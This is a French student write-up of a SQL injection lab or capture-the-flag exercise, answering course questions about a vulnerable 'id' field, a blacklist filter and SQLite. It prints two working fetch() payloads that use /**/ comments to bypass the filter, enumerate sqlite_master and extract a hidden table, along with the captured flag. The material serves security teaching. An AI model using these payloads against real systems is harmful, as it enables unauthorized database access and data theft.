# SQL Injection

> 1. Quelle partie du service est vulnérable à une injection SQL ?

Le champ `id` d'une requête `POST` est vulnérable à une injection SQL.

> 2. Le serveur implémente une forme insuffisante de validation des entrées. Expliquer pourquoi
c’est insuffisant.

Le serveur implémente une validation des entrées en interdisant une certaine liste de caractères. 
Cette approche est insuffisante, car il n'y a aucune affirmation que la liste soit suffisante ou tenue à jour. 
De plus, les attaques peuvent contourner ce genre de protection en utilisant les commentaires SQL.

> 3. Quel est le flag ? Comment avez-vous procédé pour l’obtenir ?

Le flag est le suivant : `SLH25{D0N7_P4r53_5Q1_M4NU411Y}`

Pour y accéder, j'ai d'abord essayer les tentatives d'injection classiques puis celles avec les commentaires. 

```javascript
fetch("http://sql.slh.cyfr.ch/flowers", {
    method: 'POST',
    body: '{"id":"id/**/union/**/select/**/type,name,sql,4/**/from/**/sqlite_master"}',
    headers: {
        "Content-type": "application/json",
    }
});
```

Cette dernière m'a permis de lister les différentes tables dans la DB. J'ai ensuite observé qu'une table `super_secret_stuff` existait. Un nom passablement étrange.

J'ai ensuite fait un sorte de récupérer cette table avec la requête suivante : 

```javascript
fetch("http://sql.slh.cyfr.ch/flowers", {
    method: 'POST',
    body:
    '{"id":"1/**/UNION/**/SELECT/**/name,/**/value,/**/null,/**/null/**/FROM/**/super_secret_stuff--"}',
    headers: {
        "Content-type": "application/json"
    }
}); 
```

Et ainsi j'ai pu récupérer le flag.

> 4. Quel est le DBMS utilisé ? Auriez-vous procédé différement si le DBMS avait été MySQL ou
MariaDB ?

Le DBMS utilisé est SQLite. Si ce dernier avait été MySQL ou MariaDB, j'aurais procédé de la même manière en regardant la documentation de ces DBMS et en remplaçant `sqlite_master` par le nom de la table répertoriant les infos générales.